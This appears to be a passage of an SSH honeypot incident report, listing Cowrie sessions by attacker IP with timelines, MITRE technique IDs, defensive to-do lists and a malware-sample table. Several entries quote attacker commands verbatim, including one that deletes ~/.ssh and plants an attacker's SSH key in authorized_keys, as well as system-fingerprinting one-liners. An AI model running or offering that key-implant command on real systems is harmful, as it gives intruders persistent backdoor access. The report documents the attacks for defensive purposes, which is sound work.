| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:43:06` | `cowrie.session.connect` |
| `2026-07-08 18:43:06` | `cowrie.client.version` |
| `2026-07-08 18:43:06` | `cowrie.client.kex` |
| `2026-07-08 18:43:07` | `cowrie.login.success` |
| `2026-07-08 18:43:07` | `cowrie.session.params` |
| `2026-07-08 18:43:07` | `cowrie.command.input` |
| `2026-07-08 18:43:07` | `cowrie.command.failed` |
| `2026-07-08 18:43:07` | `cowrie.log.closed` |
| `2026-07-08 18:43:08` | `cowrie.session.params` |
| `2026-07-08 18:43:08` | `cowrie.command.input` |
| `2026-07-08 18:43:08` | `cowrie.session.file_download` |
| `2026-07-08 18:43:08` | `cowrie.log.closed` |
| `2026-07-08 18:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.96.182[.]111` to AbuseIPDB if not already reported
- [ ] Block `172.96.182[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59f2dd508856

| Field | Detail |
|---|---|
| **Source IP** | `172.96.182[.]111` |
| **First Seen** | 2026-07-08 18:43 |
| **Last Seen** | 2026-07-08 18:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:43:08` | `cowrie.session.connect` |
| `2026-07-08 18:43:08` | `cowrie.client.version` |
| `2026-07-08 18:43:08` | `cowrie.client.kex` |
| `2026-07-08 18:43:09` | `cowrie.login.success` |
| `2026-07-08 18:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.96.182[.]111` to AbuseIPDB if not already reported
- [ ] Block `172.96.182[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41fea7486cd7

| Field | Detail |
|---|---|
| **Source IP** | `172.96.182[.]111` |
| **First Seen** | 2026-07-08 18:43 |
| **Last Seen** | 2026-07-08 18:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:43:09` | `cowrie.session.connect` |
| `2026-07-08 18:43:09` | `cowrie.client.version` |
| `2026-07-08 18:43:09` | `cowrie.client.kex` |
| `2026-07-08 18:43:09` | `cowrie.login.success` |
| `2026-07-08 18:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.96.182[.]111` to AbuseIPDB if not already reported
- [ ] Block `172.96.182[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd51b2ef9678

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 18:43 |
| **Last Seen** | 2026-07-08 18:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:43:27` | `cowrie.session.connect` |
| `2026-07-08 18:43:28` | `cowrie.client.version` |
| `2026-07-08 18:43:28` | `cowrie.client.kex` |
| `2026-07-08 18:43:32` | `cowrie.login.success` |
| `2026-07-08 18:43:35` | `cowrie.session.params` |
| `2026-07-08 18:43:35` | `cowrie.command.input` |
| `2026-07-08 18:43:37` | `cowrie.log.closed` |
| `2026-07-08 18:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e6064bda7e

| Field | Detail |
|---|---|
| **Source IP** | `134.209.120[.]216` |
| **First Seen** | 2026-07-08 18:43 |
| **Last Seen** | 2026-07-08 18:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:43:56` | `cowrie.session.connect` |
| `2026-07-08 18:43:56` | `cowrie.client.version` |
| `2026-07-08 18:43:56` | `cowrie.client.kex` |
| `2026-07-08 18:43:56` | `cowrie.login.success` |
| `2026-07-08 18:43:57` | `cowrie.session.params` |
| `2026-07-08 18:43:57` | `cowrie.command.input` |
| `2026-07-08 18:43:57` | `cowrie.command.failed` |
| `2026-07-08 18:43:57` | `cowrie.log.closed` |
| `2026-07-08 18:43:58` | `cowrie.session.params` |
| `2026-07-08 18:43:58` | `cowrie.command.input` |
| `2026-07-08 18:43:58` | `cowrie.session.file_download` |
| `2026-07-08 18:43:58` | `cowrie.log.closed` |
| `2026-07-08 18:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.120[.]216` to AbuseIPDB if not already reported
- [ ] Block `134.209.120[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c335d87e4c4d

| Field | Detail |
|---|---|
| **Source IP** | `134.209.120[.]216` |
| **First Seen** | 2026-07-08 18:43 |
| **Last Seen** | 2026-07-08 18:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:43:58` | `cowrie.session.connect` |
| `2026-07-08 18:43:58` | `cowrie.client.version` |
| `2026-07-08 18:43:58` | `cowrie.client.kex` |
| `2026-07-08 18:43:58` | `cowrie.login.success` |
| `2026-07-08 18:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.120[.]216` to AbuseIPDB if not already reported
- [ ] Block `134.209.120[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78477ab95482

| Field | Detail |
|---|---|
| **Source IP** | `134.209.120[.]216` |
| **First Seen** | 2026-07-08 18:43 |
| **Last Seen** | 2026-07-08 18:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:43:58` | `cowrie.session.connect` |
| `2026-07-08 18:43:58` | `cowrie.client.version` |
| `2026-07-08 18:43:58` | `cowrie.client.kex` |
| `2026-07-08 18:43:58` | `cowrie.login.success` |
| `2026-07-08 18:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.120[.]216` to AbuseIPDB if not already reported
- [ ] Block `134.209.120[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90e999d812c9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:45 |
| **Last Seen** | 2026-07-08 18:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:45:29` | `cowrie.session.connect` |
| `2026-07-08 18:45:29` | `cowrie.client.version` |
| `2026-07-08 18:45:29` | `cowrie.client.kex` |
| `2026-07-08 18:45:31` | `cowrie.login.success` |
| `2026-07-08 18:45:33` | `cowrie.session.params` |
| `2026-07-08 18:45:33` | `cowrie.command.input` |
| `2026-07-08 18:45:33` | `cowrie.command.input` |
| `2026-07-08 18:45:33` | `cowrie.command.input` |
| `2026-07-08 18:45:33` | `cowrie.command.input` |
| `2026-07-08 18:45:33` | `cowrie.command.input` |
| `2026-07-08 18:45:33` | `cowrie.command.success` |
| `2026-07-08 18:45:33` | `cowrie.command.input` |
| `2026-07-08 18:45:33` | `cowrie.command.input` |
| `2026-07-08 18:45:33` | `cowrie.command.input` |
| `2026-07-08 18:45:33` | `cowrie.command.input` |
| `2026-07-08 18:45:34` | `cowrie.log.closed` |
| `2026-07-08 18:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f46a3205a7d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-08 18:47 |
| **Last Seen** | 2026-07-08 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:47:20` | `cowrie.session.connect` |
| `2026-07-08 18:47:20` | `cowrie.client.version` |
| `2026-07-08 18:47:20` | `cowrie.client.kex` |
| `2026-07-08 18:47:21` | `cowrie.login.success` |
| `2026-07-08 18:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a45130766ec

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-08 18:47 |
| **Last Seen** | 2026-07-08 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:47:20` | `cowrie.session.connect` |
| `2026-07-08 18:47:20` | `cowrie.client.version` |
| `2026-07-08 18:47:20` | `cowrie.client.kex` |
| `2026-07-08 18:47:21` | `cowrie.login.success` |
| `2026-07-08 18:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33af683574fc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:47 |
| **Last Seen** | 2026-07-08 18:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:47:54` | `cowrie.session.connect` |
| `2026-07-08 18:47:54` | `cowrie.client.version` |
| `2026-07-08 18:47:54` | `cowrie.client.kex` |
| `2026-07-08 18:47:55` | `cowrie.login.success` |
| `2026-07-08 18:47:57` | `cowrie.session.params` |
| `2026-07-08 18:47:57` | `cowrie.command.input` |
| `2026-07-08 18:47:57` | `cowrie.command.input` |
| `2026-07-08 18:47:57` | `cowrie.command.input` |
| `2026-07-08 18:47:57` | `cowrie.command.input` |
| `2026-07-08 18:47:57` | `cowrie.command.input` |
| `2026-07-08 18:47:57` | `cowrie.command.success` |
| `2026-07-08 18:47:57` | `cowrie.command.input` |
| `2026-07-08 18:47:57` | `cowrie.command.input` |
| `2026-07-08 18:47:57` | `cowrie.command.input` |
| `2026-07-08 18:47:57` | `cowrie.command.input` |
| `2026-07-08 18:47:57` | `cowrie.log.closed` |
| `2026-07-08 18:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c37f153d4322

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:50 |
| **Last Seen** | 2026-07-08 18:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:50:16` | `cowrie.session.connect` |
| `2026-07-08 18:50:17` | `cowrie.client.version` |
| `2026-07-08 18:50:17` | `cowrie.client.kex` |
| `2026-07-08 18:50:18` | `cowrie.login.success` |
| `2026-07-08 18:50:20` | `cowrie.session.params` |
| `2026-07-08 18:50:20` | `cowrie.command.input` |
| `2026-07-08 18:50:20` | `cowrie.command.input` |
| `2026-07-08 18:50:20` | `cowrie.command.input` |
| `2026-07-08 18:50:20` | `cowrie.command.input` |
| `2026-07-08 18:50:20` | `cowrie.command.input` |
| `2026-07-08 18:50:20` | `cowrie.command.success` |
| `2026-07-08 18:50:20` | `cowrie.command.input` |
| `2026-07-08 18:50:20` | `cowrie.command.input` |
| `2026-07-08 18:50:20` | `cowrie.command.input` |
| `2026-07-08 18:50:20` | `cowrie.command.input` |
| `2026-07-08 18:50:21` | `cowrie.log.closed` |
| `2026-07-08 18:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5681680e880

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 18:51 |
| **Last Seen** | 2026-07-08 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:51:29` | `cowrie.session.connect` |
| `2026-07-08 18:51:29` | `cowrie.client.version` |
| `2026-07-08 18:51:29` | `cowrie.client.kex` |
| `2026-07-08 18:51:30` | `cowrie.login.success` |
| `2026-07-08 18:51:30` | `cowrie.session.params` |
| `2026-07-08 18:51:30` | `cowrie.command.input` |
| `2026-07-08 18:51:30` | `cowrie.log.closed` |
| `2026-07-08 18:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-914bfb441c91

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 18:52 |
| **Last Seen** | 2026-07-08 18:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:52:08` | `cowrie.session.connect` |
| `2026-07-08 18:52:09` | `cowrie.client.version` |
| `2026-07-08 18:52:09` | `cowrie.client.kex` |
| `2026-07-08 18:52:13` | `cowrie.login.success` |
| `2026-07-08 18:52:16` | `cowrie.session.params` |
| `2026-07-08 18:52:16` | `cowrie.command.input` |
| `2026-07-08 18:52:17` | `cowrie.log.closed` |
| `2026-07-08 18:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7957af97a05

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:52 |
| **Last Seen** | 2026-07-08 18:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:52:37` | `cowrie.session.connect` |
| `2026-07-08 18:52:37` | `cowrie.client.version` |
| `2026-07-08 18:52:37` | `cowrie.client.kex` |
| `2026-07-08 18:52:39` | `cowrie.login.success` |
| `2026-07-08 18:52:40` | `cowrie.session.params` |
| `2026-07-08 18:52:40` | `cowrie.command.input` |
| `2026-07-08 18:52:40` | `cowrie.command.input` |
| `2026-07-08 18:52:40` | `cowrie.command.input` |
| `2026-07-08 18:52:40` | `cowrie.command.input` |
| `2026-07-08 18:52:40` | `cowrie.command.input` |
| `2026-07-08 18:52:40` | `cowrie.command.success` |
| `2026-07-08 18:52:40` | `cowrie.command.input` |
| `2026-07-08 18:52:40` | `cowrie.command.input` |
| `2026-07-08 18:52:40` | `cowrie.command.input` |
| `2026-07-08 18:52:40` | `cowrie.command.input` |
| `2026-07-08 18:52:40` | `cowrie.log.closed` |
| `2026-07-08 18:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-673a5fc1fa84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:54 |
| **Last Seen** | 2026-07-08 18:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:54:57` | `cowrie.session.connect` |
| `2026-07-08 18:54:58` | `cowrie.client.version` |
| `2026-07-08 18:54:58` | `cowrie.client.kex` |
| `2026-07-08 18:54:59` | `cowrie.login.success` |
| `2026-07-08 18:55:00` | `cowrie.session.params` |
| `2026-07-08 18:55:00` | `cowrie.command.input` |
| `2026-07-08 18:55:00` | `cowrie.command.input` |
| `2026-07-08 18:55:00` | `cowrie.command.input` |
| `2026-07-08 18:55:00` | `cowrie.command.input` |
| `2026-07-08 18:55:00` | `cowrie.command.input` |
| `2026-07-08 18:55:00` | `cowrie.command.success` |
| `2026-07-08 18:55:00` | `cowrie.command.input` |
| `2026-07-08 18:55:00` | `cowrie.command.input` |
| `2026-07-08 18:55:00` | `cowrie.command.input` |
| `2026-07-08 18:55:00` | `cowrie.command.input` |
| `2026-07-08 18:55:00` | `cowrie.log.closed` |
| `2026-07-08 18:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **47** | 2026-07-08 16:55 | 2026-07-08 18:50 | 51m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-08 16:56 | 2026-07-08 18:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-07-08 17:18 | 2026-07-08 18:18 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `112.27.38[.]203` | 1 | 2026-07-08 17:52 | 2026-07-08 17:52 | 12s | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | 1 | 2026-07-08 17:47 | 2026-07-08 17:48 | 48s | 0 | `T1592` | 🟢 LOW |
| `185.107.80[.]93` | 1 | 2026-07-08 17:53 | 2026-07-08 17:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-08 17:58 | 2026-07-08 17:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.250.52[.]75` | 1 | 2026-07-08 18:28 | 2026-07-08 18:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.99.212[.]58` | 1 | 2026-07-08 16:58 | 2026-07-08 16:58 | 11s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-08 17:20 | 2026-07-08 17:22 | 80s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-08 17:37 | 2026-07-08 17:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-08 18:33 | 2026-07-08 18:33 | 40s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]23` | 1 | 2026-07-08 18:39 | 2026-07-08 18:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-07-08 18:33 | 2026-07-08 18:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-07-08 18:23 | 2026-07-08 18:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `98.181.137[.]69` | 1 | 2026-07-08 17:36 | 2026-07-08 17:38 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 54/100 | 🟡 MEDIUM | **10/73** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
